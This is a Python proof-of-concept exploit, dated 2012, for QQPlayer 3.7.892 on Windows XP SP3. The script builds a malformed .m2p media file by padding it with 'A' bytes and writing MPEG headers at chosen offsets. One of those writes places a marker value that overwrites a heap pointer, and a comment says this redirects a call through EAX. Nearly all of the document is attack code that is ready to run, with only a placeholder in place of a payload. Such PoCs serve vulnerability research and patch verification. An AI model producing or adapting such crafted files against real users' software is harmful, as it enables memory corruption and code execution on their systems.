# Exploit Title: QQPlayer 3.7.892 m2p quartz.dll heap pointer overwrite PoC
# Date: 10/14/2012
# Author: James Ritchey
# Vendor Homepage: www.qq-player.com
# Software Link: http://www.qq-player.com/download_en.php
# Version: 3.7.892
# Tested on: Windows XP SP3


l = 3315716 * "A"
s1 = ((0,'\x00\x00\x01\xba'), (2048, '\x00\x00\x01\xba'),
      (3289120, '\x00\x00\x01\xe0\x07'), (3289273, '\x00\x00\x01\xb3'),
      (3289283, '\xba'), (3289452, '\x42\x42\x42\x42'),
      (3289468, '\x00\x00\x01\x00'), (3290359, '\x00\x00\x01\x00'),
      (3301408, '\x00\x00\x01\xe0\x07'), (3303112, '\x00\x00\x01\x00'))
# EAX overwrite(3289452, '\x42\x42\x42\x42') call eax+0x24

o = open("c:\\poc.m2p","wb")
o.write(l)

for i in range(len(s1)):
    o.seek(s1[i][0], 0)
    o.write(s1[i][1])

o.close()